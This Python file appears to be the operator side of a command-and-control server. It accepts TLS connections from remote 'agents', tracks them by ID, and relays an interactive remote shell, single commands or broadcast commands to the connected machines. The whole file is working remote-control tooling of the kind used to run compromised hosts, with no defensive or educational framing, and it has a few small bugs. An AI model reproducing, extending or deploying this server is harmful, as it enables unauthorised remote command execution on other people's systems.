import socket
import threading
import ssl

class Agent:
    def __init__(self, conn, sock, id):
        self.ip = conn[0]
        self.port = conn[1]
        self.sock = sock
        self.id = id

    def __str__(self):
        return f"[{self.id}] Agent: {self.ip}:{self.port}"

class Command:
    def execute(self, command):
        pass

class Server:
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.agents = []
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.current_id = 1
        self.server_stop = False
        self.current_session = 0

    def __str__(self):
        return f"Server: {len(self.agents)} agents connected"

    def addAgent(self, agent: 'Agent'):
        self.agents.append(agent)

    def displayAgents(self):
        for agent in self.agents:
            print(agent)

    def handleClient(self, agent):
        agent.sock.send("Welcome agent\n".encode())

    def acceptConnections(self):
        while not self.server_stop:
            client_socket, client_address = self.sock.accept()
            try:
                # Wrap the socket with TLS
                client_socket = self.context.wrap_socket(client_socket, server_side=True)
                agent = self.newAgent(client_address, client_socket)
                threading.Thread(target=self.handleClient, args=(agent,)).start()
            except ssl.SSLError as e:
                print(f"SSL error: {e}")

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.address, self.port))
        print(self)
        self.sock.listen(5)
        
        # Create SSL context
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        
        threading.Thread(target=self.acceptConnections).start()

    def main_loop(self):
        while True:
            active_agent = f"[{len(self.agents)} active]" if self.current_session == 0 else f"[Agent {self.current_session}]"
            command = input(f"{active_agent}> ")

            if command == "exit":
                self.closeAllConn()
                self.server_socket.close()
                self.server_stop = True
                exit(0)
            elif command == "agents":
                self.displayAgents()
            elif command.startswith("agent "):
                self.current_session = int(command.replace("agent ",''))

            elif command == "shell":
                agent = self.agents[self.current_session - 1] 
                if self.current_session > 0:
                    agent.sock.send(f"shell".encode())
                    while True:
                        command = input('$> ')
                        if command.lower() == 'exit':
                            agent.sock.send(b'exit\n')
                            break
                        agent.sock.send(command.encode() + b'\n')
                        

            elif command.startswith("send"):
                if self.current_session > 0:
                    self.agents[self.current_session - 1].sock.send(f"{command.replace('send ','')}\n".encode())
                else:
                    print("Please select an agent as target.")

            elif command == "bg":
                self.current_session = 0
            
            elif command.startswith("broadcast"):
                self.broadcast(command.replace('broadcast ',''))

    def closeAllConn(self):
        for agent in self.agents:
            agent.sock.close()

    def newAgent(self, client_address, client_socket):
        agent_id = self.current_id
        self.current_id += 1
        agent = Agent(client_address, client_socket, agent_id)
        print(f"New connection:\n{agent}")
        self.addAgent(agent)
        return agent

    def broadcast(self, message):

        for agent in self.agents:
            agent.sock.send(message.encode())



